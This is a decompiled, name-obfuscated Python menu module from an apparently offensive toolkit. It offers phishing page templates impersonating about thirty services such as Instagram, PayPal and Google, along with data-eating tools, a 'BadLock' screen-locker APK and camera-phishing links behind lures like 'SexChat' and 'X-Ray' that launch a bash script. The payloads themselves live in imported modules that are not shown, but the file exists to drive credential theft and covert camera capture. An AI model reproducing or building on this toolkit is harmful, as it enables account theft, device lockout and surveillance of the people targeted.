# Source Generated with Decompyle++
# File: lang.pyc (Python 3.8)

from files.startup import *
from files.template import *
from files.deater import *
import os

def lang():
    O0OO00O0O0000OO0O = '\x1b[1;37mLanguage' + red + '\n1-EN' + green + '\n2-DE\n'
    slow(O0OO00O0O0000OO0O, 0.025)
    OOOOOO0000O00000O = str(input(blue + 'Choose>'))
    if str(OOOOOO0000O00000O) == '1':
        slow('....Ok Man....', 0.01)
        os.system('clear')
        OO00O00O00O0OOO00 = '\x1b[1;93m[1]\x1b[1;91m Phishing Websites (Templates)\n\x1b[1;93m[2]\x1b[1;91m Data Eaters\n\x1b[1;93m[3]\x1b[1;91m BadLock (apk)\n\x1b[1;93m[4]\x1b[1;91m Camera Phishing(link)\n\x1b[1;93m[5]\x1b[1;91m Voice Phishing (link)\n\x1b[1;93m[6]\x1b[1;91m Other\n\x1b[1;93m[7]\x1b[1;91m Custom \n\x1b[1;93m[0]\x1b\x1b[1;91m Exit\n'
        slogo()
        slow(OO00O00O00O0OOO00, 0.01)
    elif str(OOOOOO0000O00000O) == '2':
        slow('Moin Moin Moin', 0.01)
        os.system('clear')
        OO00O00O00O0OOO00 = '\x1b[1;93m[1]\x1b[1;91m Phishing-Betrug (Templates)\n\x1b[1;93m[2]\x1b[1;91m Datenfresser\n\x1b[1;93m[3]\x1b[1;91m Bildshcirmschloss (apk)\n\x1b[1;93m[4]\x1b[1;91m Camera Phishing(link)\n\x1b[1;93m[5]\x1b[1;91m Voice Phishing (link)\n\x1b[1;93m[6]\x1b[1;91m Andere\n\x1b[1;93m[7]\x1b[1;91m Benutzerdefiniert \n\x1b[1;93m[0]\x1b\x1b[1;91m Verlassen\n'
        slogo()
        slow(OO00O00O00O0OOO00, 0.01)
    else:
        print('Wrong input!')
        lang()


def sites():
    print('\x1b[1;92m[\x1b[0m\x1b[1;77m01\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m Instagram\x1b[0m      \x1b[1;92m[\x1b[0m\x1b[1;77m17\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m IGFollowers\x1b[0m')
    print('\x1b[1;92m[\x1b[0m\x1b[1;77m02\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m Facebook\x1b[0m       \x1b[1;92m[\x1b[0m\x1b[1;77m18\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m Pinterest   \x1b[0m')
    print('\x1b[1;92m[\x1b[0m\x1b[1;77m03\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m Snapchat\x1b[0m       \x1b[1;92m[\x1b[0m\x1b[1;77m19\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m CryptoCurrency   \x1b[0m')
    print('\x1b[1;92m[\x1b[0m\x1b[1;77m04\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m Twitter\x1b[0m        \x1b[1;92m[\x1b[0m\x1b[1;77m20\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m Verizon   \x1b[0m')
    print('\x1b[1;92m[\x1b[0m\x1b[1;77m05\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m Github\x1b[0m         \x1b[1;92m[\x1b[0m\x1b[1;77m21\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m DropBox   \x1b[0m ')
    print('\x1b[1;92m[\x1b[0m\x1b[1;77m06\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m Google\x1b[0m         \x1b[1;92m[\x1b[0m\x1b[1;77m22\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m Adobe ID   \x1b[0m ')
    print('\x1b[1;92m[\x1b[0m\x1b[1;77m07\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m Spotify\x1b[0m        \x1b[1;92m[\x1b[0m\x1b[1;77m23\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m Shopify   \x1b[0m  ')
    print('\x1b[1;92m[\x1b[0m\x1b[1;77m08\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m Netflix\x1b[0m        \x1b[1;92m[\x1b[0m\x1b[1;77m24\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m Messenger   \x1b[0m')
    print('\x1b[1;92m[\x1b[0m\x1b[1;77m09\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m PayPal\x1b[0m         \x1b[1;92m[\x1b[0m\x1b[1;77m25\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m GitLab   \x1b[0m    ')
    print('\x1b[1;92m[\x1b[0m\x1b[1;77m10\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m Origin\x1b[0m         \x1b[1;92m[\x1b[0m\x1b[1;77m26\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m Twitch   \x1b[0m     ')
    print('\x1b[1;92m[\x1b[0m\x1b[1;77m11\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m Steam\x1b[0m          \x1b[1;92m[\x1b[0m\x1b[1;77m27\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m MySpace   \x1b[0m    ')
    print('\x1b[1;92m[\x1b[0m\x1b[1;77m12\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m Yahoo\x1b[0m          \x1b[1;92m[\x1b[0m\x1b[1;77m28\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m Badoo   \x1b[0m      ')
    print('\x1b[1;92m[\x1b[0m\x1b[1;77m13\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m Linkedin\x1b[0m       \x1b[1;92m[\x1b[0m\x1b[1;77m29\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m VK   \x1b[0m         ')
    print('\x1b[1;92m[\x1b[0m\x1b[1;77m15\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m Wordpress\x1b[0m      \x1b[1;92m[\x1b[0m\x1b[1;77m30\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m Yandex   \x1b[0m     ')
    print('\x1b[1;92m[\x1b[0m\x1b[1;77m14\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m Protonmail\x1b[0m     \x1b[1;92m[\x1b[0m\x1b[1;77m31\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m devianART   \x1b[0m ')
    print('\x1b[1;92m[\x1b[0m\x1b[1;77m16\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m Microsoft\x1b[0m      ')
    print('\x1b[1;92m[\x1b[0m\x1b[1;77m00\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m Back\x1b[0m ')
    csite()


def mm():
    OO0OO00O0O0OO0OO0 = input(red + 'Option ' + yellow + '>' + green)
    if OO0OO00O0O0OO0OO0 == '1':
        sites()
    elif OO0OO00O0O0OO0OO0 == '2':
        os.system('clear')
        slogo()
        deater()
    elif OO0OO00O0O0OO0OO0 == '3':
        os.system('clear')
        slogo()
        block()
    elif OO0OO00O0O0OO0OO0 == '4':
        os.system('clear')
        slogo()
        camphish()
    elif OO0OO00O0O0OO0OO0 == '5':
        soon()
    elif OO0OO00O0O0OO0OO0 == '6':
        soon()
    elif OO0OO00O0O0OO0OO0 == '7':
        soon()
    elif OO0OO00O0O0OO0OO0 == '8':
        soon()
    elif OO0OO00O0O0OO0OO0 == '0':
        lang()
    else:
        print('wrong input!')
        mm()


def camphish():
    O00OO00O00000O0OO = red + '[' + green + '0' + red + ']'
    OO0O00OOO0O0OOOO0 = [
        'SexChat',
        'Learn English',
        'Gay Video Chat',
        'Lesbian Video Chat',
        'Make me Old',
        'X-Ray',
        'Online make-up',
        'exit']
    OOO00OOOO000O0O00 = 0
    while OOO00OOOO000O0O00 < len(OO0O00OOO0O0OOOO0):
        slow('\n\r' + O00OO00O00000O0OO.replace('0', str(OOO00OOOO000O0O00 + 1)) + yellow + ' ' + OO0O00OOO0O0OOOO0[OOO00OOOO000O0O00], 0.005)
        OOO00OOOO000O0O00 = OOO00OOOO000O0O00 + 1
        continue
    OO0O00000OO0OO000 = '/sdcard'
    print('\n')
    O000O0OOOOO0000OO = input(green + 'Choice ' + red + '>' + yellow)
    if O000O0OOOOO0000OO == '1':
        os.system('cd cp/1/;bash script.sh')
    elif O000O0OOOOO0000OO == '2' and O000O0OOOOO0000OO == '3' and O000O0OOOOO0000OO == '4' and O000O0OOOOO0000OO == '5' and O000O0OOOOO0000OO == '6' or O000O0OOOOO0000OO == '7':
        soon()
    else:
        os.system('clear')
        camphish()

